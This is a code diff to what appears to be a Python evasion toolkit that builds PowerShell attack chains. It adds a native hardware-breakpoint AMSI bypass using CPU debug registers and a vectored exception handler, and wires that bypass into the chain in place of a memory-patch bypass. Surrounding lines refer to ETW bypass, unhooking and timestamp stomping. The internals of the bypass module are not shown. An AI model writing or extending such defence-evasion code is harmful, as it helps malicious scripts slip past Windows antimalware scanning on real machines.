@@ -46,6 +46,22 @@ try:
 except ImportError:
     HAS_PYWIN32 = False
 
+try:
+    from evasion.hwbp_amsi_bypass import (
+        HWBPAMSIBypass,
+        get_hwbp_amsi_bypass,
+        enable_amsi_hwbp,
+        disable_amsi_hwbp,
+        is_amsi_hwbp_active,
+        HWBPResult,
+        HWBStatus,
+    )
+    HAS_HWBP = True
+except ImportError:
+    HAS_HWBP = False
+    HWBPResult = None
+    HWBStatus = None
+
 
 # =============================================================================
 # ENUMS AND DATA STRUCTURES
@@ -829,6 +845,23 @@ Add-Type $HWBPBypass -ErrorAction SilentlyContinue
 '''
         return bypass.strip()
     
+    def _apply_native_hwbp_bypass(self) -> HWBPResult:
+        """
+        Apply native HWBP-based AMSI bypass (no memory patch).
+        Uses CPU debug registers + VectoredExceptionHandler.
+        """
+        if not HAS_HWBP:
+            return HWBPResult(False, HWBStatus.ERROR, error="HWBP module not available")
+        
+        try:
+            engine = get_hwbp_amsi_bypass()
+            result = engine.enable()
+            if result.success:
+                self._active_bypasses["hwbp_amsi"] = True
+            return result
+        except Exception as exc:
+            return HWBPResult(False, HWBStatus.ERROR, error=str(exc))
+    
     # =========================================================================
     # ETW BYPASS TECHNIQUES
     # =========================================================================
@@ -1210,15 +1243,28 @@ function Invoke-TimestampStomp {
             chain.append(self.get_unhook())
             chain.append("")
         
-        # 4. Hardware BP clear
+        # 4. Hardware BP native bypass (preferred) or cleanup
         if self.opsec_level >= 3:
-            chain.append("# [3] Hardware Breakpoint Cleanup")
-            chain.append(self._generate_hardware_bp_bypass())
+            if HAS_HWBP:
+                chain.append("# [3] Hardware Breakpoint AMSI Bypass (native)")
+                hwbp_result = self._apply_native_hwbp_bypass()
+                if hwbp_result.success:
+                    chain.append(f"# [+] HWBP enabled at 0x{hwbp_result.amsi_addr:016X}")
+                else:
+                    chain.append(f"# [!] HWBP failed: {hwbp_result.error}")
+                    chain.append(self._generate_hardware_bp_bypass())
+            else:
+                chain.append("# [3] Hardware Breakpoint Cleanup")
+                chain.append(self._generate_hardware_bp_bypass())
             chain.append("")
         
         # 5. AMSI Bypass
         chain.append("# [4] AMSI Bypass - Disable scanning")
-        chain.append(self.get_amsi_bypass())
+        # If HWBP is active, skip memory patch to avoid conflict
+        if not (HAS_HWBP and self._active_bypasses.get("hwbp_amsi")):
+            chain.append(self.get_amsi_bypass())
+        else:
+            chain.append("# HWBP active - skipping memory patch to avoid conflict")
         chain.append("")
         
         # 6. OPSEC Post-flight
